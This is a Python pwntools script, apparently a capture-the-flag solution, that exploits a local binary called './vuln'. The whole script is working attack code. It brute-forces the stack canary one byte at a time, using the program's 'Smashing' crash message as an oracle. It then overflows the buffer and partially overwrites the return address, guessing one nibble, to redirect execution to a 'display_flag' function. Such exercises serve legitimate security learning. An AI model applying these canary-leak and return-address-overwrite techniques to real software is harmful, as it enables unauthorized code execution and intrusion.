#!/bin/python3

from pwn import *

# context.log_level = 'debug'
context.log_level = 'error'


canaryOffset = 0x58 - 0x38 # from gdb
retOffset = 0x6c - 0x5c


def leakCanary():

	payload = b"A"*canaryOffset

	canary = b""

	payloadLen = canaryOffset

	for _ in range(4): # because there are 4 bytes
		payloadLen +=1
		for c in range(2**8):
			p = process('./vuln')
			p.recvuntil(b"> ")
			p.sendline(str.encode(str(payloadLen)))
			p.recvuntil(b"> ")
			p.send(payload + canary + str.encode(chr(c)))
			response = p.recv()
			p.close()
			if b"Smashing" not in response:
				canary += str.encode(chr(c))
				print(canary.decode() + "*"*(4-len(canary)))
				break
	return canary

def exploit(canary):
	e = ELF('./vuln')

	flagOut = b""
	while(flagOut == b""):
		for i in range(0x10):
			p = process('./vuln')

			payload = b"A"*canaryOffset
			payload += canary
			payload += b"B"*retOffset

			'''
			- Here, instead of completely overwriting the address, 
			  we only overwrite the last 2 bytes, as they are the
			  only things that differ between the addresses of main
			  and display_flag
			- The below line of code builds the last 2 bytes of the
			  address based on the idea that we only have to bruteforce
			  the 4th nibble. 

			'''
			addressOfWin = p16(int(hex(e.sym['display_flag'] % 0x1000 + 0x1000*i)[2:].zfill(4), 16))
			payload += addressOfWin

			p.recvuntil(b"> ")
			p.sendline(str.encode(str(len(payload))))

			p.recvuntil(b"> ")
			p.send(payload)

			p.recvuntil(b"Flag?\n")

			try:
				flagOut = p.recv()
			except:
				print(f'Try {i:02}: Failed')

			p.close()
	return flagOut.rstrip().decode('UTF-8')


canary = leakCanary()
# canary = b'LjgH'
print(f'Found the canary: {canary}')
flag = exploit(canary)  
print(flag)


